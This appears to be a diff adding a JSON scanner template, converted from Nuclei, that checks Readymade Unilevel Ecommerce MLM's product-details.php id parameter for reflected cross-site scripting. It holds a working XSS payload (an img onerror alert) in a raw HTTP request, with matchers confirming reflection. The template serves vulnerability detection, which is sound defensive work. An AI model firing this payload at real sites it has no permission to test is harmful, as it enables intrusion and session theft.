@@ -1,0 +1,124 @@
+{
+  "id": "readymade-unilevel-xss",
+  "name": "Readymade Unilevel Ecommerce MLM - Cross-Site Scripting",
+  "author": "s4e-io",
+  "severity": "HIGH",
+  "description": "Readymade Unilevel Ecommerce software has xss vulnerability in product-details.php?id\n",
+  "references": [
+    "https://packetstormsecurity.com/files/179886/ReadyMade-Unilevel-Ecommerce-MLM-Blind-SQL-Injection-Cross-Site-Scripting.html"
+  ],
+  "tags": [
+    "ecommerce",
+    "readymade",
+    "xss"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {
+    "num1": [
+      "{{rand_int(1000, 9999)}}"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /product-details.php?id\u003d1\"\u003e\u003cimg/src/onerror\u003d.1|alert`{{num1}}`+class\u003d{{num1}}\u003e HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains_all(body, \"\u003e\u003cimg/src/onerror\u003d.1|alert`{{num1}}` class\u003d{{num1}}\u003e\", \"user_login_id\")",
+            "contains(content_type, \"text/html\")",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "readymade-unilevel-xss",
+    "info": {
+      "name": "Readymade Unilevel Ecommerce MLM - Cross-Site Scripting",
+      "author": "s4e-io",
+      "severity": "high",
+      "description": "Readymade Unilevel Ecommerce software has xss vulnerability in product-details.php?id\n",
+      "reference": [
+        "https://packetstormsecurity.com/files/179886/ReadyMade-Unilevel-Ecommerce-MLM-Blind-SQL-Injection-Cross-Site-Scripting.html"
+      ],
+      "metadata": {
+        "max_request": 0
+      },
+      "tags": "ecommerce,readymade,xss"
+    },
+    "variables": {
+      "num1": "{{rand_int(1000, 9999)}}"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /product-details.php?id\u003d1\"\u003e\u003cimg/src/onerror\u003d.1|alert`{{num1}}`+class\u003d{{num1}}\u003e HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains_all(body, \"\u003e\u003cimg/src/onerror\u003d.1|alert`{{num1}}` class\u003d{{num1}}\u003e\", \"user_login_id\")",
+              "contains(content_type, \"text/html\")",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
